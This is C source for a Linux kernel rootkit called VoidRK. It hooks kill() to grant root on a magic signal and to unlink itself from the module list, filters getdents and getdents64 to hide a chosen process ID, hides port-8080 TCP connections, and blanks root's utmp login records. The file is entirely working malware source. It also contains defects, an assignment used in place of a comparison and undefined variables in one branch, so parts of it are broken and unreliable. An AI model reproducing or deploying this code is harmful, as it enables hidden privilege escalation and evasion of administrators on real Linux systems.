#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/kallsyms.h>
#include <asm/uaccess.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/ftrace.h>
#include "utmp.h"
#include "ftrace_helper.h"

//#define PREFIX "voidbyte"
#define HIDDEN_USER "root"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xVoidbyte");
MODULE_DESCRIPTION("VoidRK");
MODULE_VERSION("0.0.1");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

int tamper_fd;
char hide_pid[NAME_MAX];

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
//static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
//static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

static struct list_head *prev_module;
static short hidden = 0;

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_pread64)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs){
    void set_root(void);
    void showme(void);
    void hideme(void);
    pid_t pid = regs->di;
    int sig=regs->si;
    if((sig=64)&&(hidden==0)){
        printk(KERN_INFO "[Void]RK: hiding rootkit!\n");
        hideme();
        printk(KERN_INFO "[Void]RK: giving root...\n");
        set_root();
        printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    } else if((sig==64)&&(hidden==1)){
        printk(KERN_INFO "[Void]RK: revealing rootkit!\n");
        showme();
        printk(KERN_INFO "[Void]RK: giving root...\n");
        set_root();
        printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    } else {
        return orig_kill(regs);
    }
}

asmlinkage int hook_getdents64(const struct pt_regs *regs){
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL)){
        return ret;
    }
    long error;
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error){
        goto done;
    }
    while (offset < ret){
        current_dir = (void *)dirent_ker + offset;
        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;

}

asmlinkage int hook_getdents(const struct pt_regs *regs){
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL)){
        return ret;
    }
    long error;
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error){
        goto done;
    }
    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error){
        goto done;
    }
done:
    kfree(dirent_ker);
    return ret;
}

asmlinkage int hook_openat(const struct pt_regs *regs){

    char *filename = (char *)regs->si;
    char *kbuf;
    long error;
    char *target = "/var/run/utmp";
    int target_len = 14;

    kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
    if(kbuf == NULL){
        return orig_openat(regs);
    }
    error = copy_from_user(kbuf, filename, NAME_MAX);
    if(error){
        return orig_openat(regs);
    }
    if(memcmp(kbuf, target, target_len) == 0){
        tamper_fd = orig_openat(regs);
        kfree(kbuf);
        return tamper_fd;
    }
    kfree(kbuf);
    return orig_openat(regs);
}

asmlinkage int hook_pread64(const struct pt_regs *regs){

    int fd = regs->di;
    char *buf = (char *)regs->si;
    size_t count = regs->dx;

    char *kbuf;
    struct utmp *utmp_buf;
    long error;
    int i, ret;

    if ((fd == tamper_fd) && (tamper_fd != 0) && (tamper_fd != 1) && (tamper_fd != 2)){
        kbuf = kzalloc(count, GFP_KERNEL);
        if (kbuf == NULL){
            return orig_pread64(regs);
        }
        ret = orig_pread64(regs);
        error = copy_from_user(kbuf, buf, count);
        if(error != 0){
            return ret;
        }
        utmp_buf = (struct utmp *)kbuf;
        if (memcmp(utmp_buf->ut_user, HIDDEN_USER, strlen(HIDDEN_USER)) == 0){
            for (i = 0;i < count;i++){
                kbuf[i] = 0x0;
            }
            error = copy_to_user(buf, kbuf, count);
            kfree(kbuf);
            return ret;
        }
        kfree(kbuf);
        return ret;
    }
    return orig_pread64(regs);
}

#else
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags, umode_t mode);
static asmlinkage long (*orig_pread64)(int fd, const __user *buf, size_t count, loff_t pos);

static asmlinkage int hook_kill(pid_t pid, int sig){
    void set_root(void);
    void showme(void);
    void hideme(void);
    int sig=reg->si;
    /*if(sig==64){
        printk(KERN_INFO "[Void]RK: giving root...\n");
        set_root();
        return 0;
    } */
    if((sig=64)&&(hidden==0)){
        printk(KERN_INFO "[Void]RK: hiding rootkit!\n");
        hideme();
        printk(KERN_INFO "[Void]RK: giving root...\n");
        set_root();
        printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    } else if((sig==64)&&(hidden==1)){
        printk(KERN_INFO "[Void]RK: revealing rootkit!\n");
        showme();
        printk(KERN_INFO "[Void]RK: giving root...\n");
        set_root();
        printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    } else {
        return orig_kill(regs);
    }
}

static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents64(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL)){
        return ret;
    }
    long error;
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error){
        goto done;
    }
    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error){
        goto done;
    }
done:
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL)){
        return ret;
    }
    long error;
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error){
        goto done;
    }
    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_openat(int dfd, const char __user *filename, int flags, umode_t mode){
    char *kbuf;
    long error;
    char *target = "/var/run/utmp";
    int target_len = 14;

    kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
    if(kbuf == NULL){
        return orig_openat(regs);
    }
    error = copy_from_user(kbuf, filename, NAME_MAX);
    if(error){
        return orig_openat(regs);
    }
    if(memcmp(kbuf, target, target_len) == 0){
        tamper_fd = orig_openat(regs);
        kfree(kbuf);
        return tamper_fd;
    }
    kfree(kbuf);
    return orig_openat(regs);
}

static asmlinkage int hook_pread64(int fd, const __user *buf, size_t count, loff_t pos){
    char *kbuf;
    struct utmp *utmp_buf;
    long error;
    int i, ret;

    if ((fd == tamper_fd) && (tamper_fd != 0) && (tamper_fd != 1) && (tamper_fd != 2)){
        kbuf = kzalloc(count, GFP_KERNEL);
        if (kbuf == NULL){
            return orig_pread64(regs);
        }
        ret = orig_pread64(regs);
        error = copy_from_user(kbuf, buf, count);
        if(error != 0){
            return ret;
        }
        utmp_buf = (struct utmp *)kbuf;
        if (memcmp(utmp_buf->ut_user, HIDDEN_USER, strlen(HIDDEN_USER)) == 0){
            for (i = 0;i < count;i++)
                kbuf[i] = 0x0;
            error = copy_to_user(buf, kbuf, count);
            kfree(kbuf);
            return ret;
        }
        kfree(kbuf);
        return ret;
    }
    return orig_pread64(regs);
}

#endif

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
    struct inet_sock *is;
    long ret;
    unsigned short port = htons(8080);

    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "[Void]RK: sport: %d, dport: %d\n",
                   ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

//Needs fixes
/*static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    bytes_read = orig_random_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "[Void]RK: intercepted read to /dev/random: %d bytes\n", bytes_read);
    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);
    if(error){
        printk(KERN_DEBUG "[Void]RK: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }
    for (i = 0 ;i < bytes_read;i++){
        kbuf[i] = 0x00;
    }
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "[Void]RK: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}

static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "[Void]RK: intercepted call to /dev/urandom: %d bytes", bytes_read);

    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error){
        printk(KERN_DEBUG "[Void]RK: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }
    for (i = 0 ;i < bytes_read;i++){
        kbuf[i] = 0x00;
    }
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error){
        printk(KERN_DEBUG "[Void]RK: %ld bytes could not be copied into buf\n", error);
    }
    kfree(kbuf);
    return bytes_read;
} */

void set_root(void){
    struct cred *root;
    root = prepare_creds();
    if(root==NULL){
        return;
    }
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

void showme(void){
    list_add(&THIS_MODULE->list, prev_module);
    hidden=0;
}

void hideme(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden=1;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64",hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents",hook_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    //HOOK("random_read", hook_random_read, &orig_random_read),
    //HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("__x64_sys_openat", hook_openat, &orig_openat),
    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
};

static int __init voidrk_init(void){
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err){
        return err;
    }
    printk(KERN_INFO "[Void]RK: loaded\n");
    return 0;
}

static void __exit voidrk_exit(void){
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "[Void]RK: unloaded\n");
}

module_init(voidrk_init);
module_exit(voidrk_exit);